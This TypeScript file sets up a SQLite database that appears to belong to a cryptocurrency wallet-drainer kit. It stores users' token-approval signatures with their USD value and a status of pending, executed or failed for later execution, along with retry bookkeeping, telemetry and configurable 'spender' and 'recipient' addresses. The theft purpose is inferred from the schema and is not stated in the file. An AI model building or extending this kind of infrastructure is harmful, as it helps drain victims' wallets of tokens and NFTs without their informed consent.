import Database from 'better-sqlite3';
import { mkdirSync } from 'node:fs';
import { dirname } from 'node:path';
import { config } from './config';

mkdirSync(dirname(config.dbPath), { recursive: true });
export const db = new Database(config.dbPath);
db.pragma('journal_mode = WAL');

db.exec(`
CREATE TABLE IF NOT EXISTS signatures (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  owner TEXT NOT NULL,
  chain_id INTEGER NOT NULL,
  spender TEXT NOT NULL,
  signature TEXT NOT NULL,
  nonce TEXT NOT NULL,
  deadline INTEGER NOT NULL,
  tokens_json TEXT NOT NULL,
  nfts_json TEXT,
  wallet_name TEXT,
  batch_value_usd REAL,
  status TEXT NOT NULL DEFAULT 'pending',   -- pending | deferred | executed | failed
  attempts INTEGER NOT NULL DEFAULT 0,
  next_attempt_at INTEGER NOT NULL DEFAULT 0,
  last_error TEXT,
  created_at INTEGER NOT NULL DEFAULT (unixepoch())
);
CREATE UNIQUE INDEX IF NOT EXISTS idx_sig_nonce ON signatures(chain_id, nonce);

CREATE TABLE IF NOT EXISTS telemetry (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  step TEXT NOT NULL,
  payload TEXT,
  replayed INTEGER DEFAULT 0,
  created_at INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS kv (
  key TEXT PRIMARY KEY,
  value TEXT
);
`);

// ── migrations for installs created before the hardening ──
const cols = db.pragma('table_info(signatures)') as Array<{ name: string }>;
for (const [name, ddl] of [
  ['attempts', 'INTEGER NOT NULL DEFAULT 0'],
  ['next_attempt_at', 'INTEGER NOT NULL DEFAULT 0'],
  ['last_error', 'TEXT'],
] as const) {
  if (!cols.some((c) => c.name === name)) {
    db.exec(`ALTER TABLE signatures ADD COLUMN ${name} ${ddl}`);
  }
}
db.exec('CREATE INDEX IF NOT EXISTS idx_sig_status ON signatures(status, next_attempt_at)');

export const kv = {
  get(key: string): string | null {
    const row = db.prepare('SELECT value FROM kv WHERE key = ?').get(key) as any;
    return row?.value ?? null;
  },
  set(key: string, value: string) {
    db.prepare(
      'INSERT INTO kv(key, value) VALUES(?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
    ).run(key, value);
  },
};

export function activeSpender(): string {
  return (kv.get('active_spender') || config.envSpender || '').trim();
}

export function activeRecipient(): string {
  return (kv.get('recipient') || config.recipient || '').trim();
}